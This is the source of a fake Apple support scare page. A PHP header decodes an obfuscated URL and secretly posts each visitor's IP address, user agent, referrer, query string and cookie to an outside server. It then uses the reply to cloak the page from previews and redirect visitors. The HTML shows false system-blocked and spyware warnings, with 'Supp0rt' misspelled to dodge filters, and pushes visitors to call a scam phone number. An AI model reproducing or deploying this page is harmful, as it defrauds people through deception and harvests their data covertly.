<?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){$date = date("Y-m-d H:i:s");$id = "495130";$uid="qil3sex0oo42w5ar329po8hfc";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_SERVER["HTTP_REFERER"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$q, TRUE, 301);}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$f, TRUE, 301);}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}}?><html lang="en"><head>
...
<a title="Web Analytics" href="https://clicky.com/101478685"></a>
<script async data-id="101478685" src="//static.getclicky.com/js"></script>
...
<script>
  ...
  gtag('config', 'UA-xxx-x');
    ...
    <audio id="mdchys">
      ...
      <a href="index-Anph=1-888888888.html#" id="link_black" style="cursor:none" rel="noreferrer">
          ...
          <div class="row">
            <div class="col-md-12">
              <div class="minimize">
                <ul>
                  <li>
                    <a href="index-Anph=1-888888888.html#">
        ...
        <div class="scan_box2">
          <div class="scan_box_header">
           ...
           <span class="fl title2" id="txts1">
              <a href="index-Anph=1-888888888.html#" id="cross">
        ...
        <div class="row">
          <div class="col-md-12">
            <div class="right-foot" style="text-align:center">
              ...
              <span style="font-weight:500;padding-left:13px;color:#fff; ">Apple_Support <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">    +<script>document.write(Anph)</script>
                </span>
              </span>
            </div>
          </div>
      ...
      <div class="lightbox" id="poptxt" onclick="beep1();" style="display: none; cursor:default;">
        ...
        <div id="disclaimer" style="color:#0F396D;">Call Supp0rt for help<br>
           <span class="Supp0rt" style="font-size:22px;">Apple_Support <span style="border:1px Solid #114d9a;border-radius:5px;padding:2px 5px">+<script>document.write(Anph)</script>
            </span>
          </span>
        </div>
        <div id="bottom">
          ...
          <ul>
            <li>
              <a href="index-Anph=1-888888888.html#" style="text-decoration: none;">
                <div class="button">
      ...
      <div class="answer_list" style="display:none;background-color: rgb(40 40 40 / 80%);height:auto;width:550px;margin-left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
        <p style="color:#FFFFFF;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">Access to this system has been blocked for security reasons. Do not access or restart this PC. If you overlook this basic warning, you may lose information about this framework. Contact Supp0rt as soon as possible and a MacOS_Spyware expert will guide you through the investigation over the phone. Running this application may put your PC at risk。<br>
          <strong>
         Apple_Support: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px">    +<script>document.write(Anph)</script>
            </span>
          </strong>
        </p>
      </div>
...
<br>Your system has been reported to be infected with Trojan-type spyware.<br>For assistance, contact MacOS Supp0rt<br><strong style="font-size:24px;">+<script>document.write(Anph)</script> 			 	</strong></p>
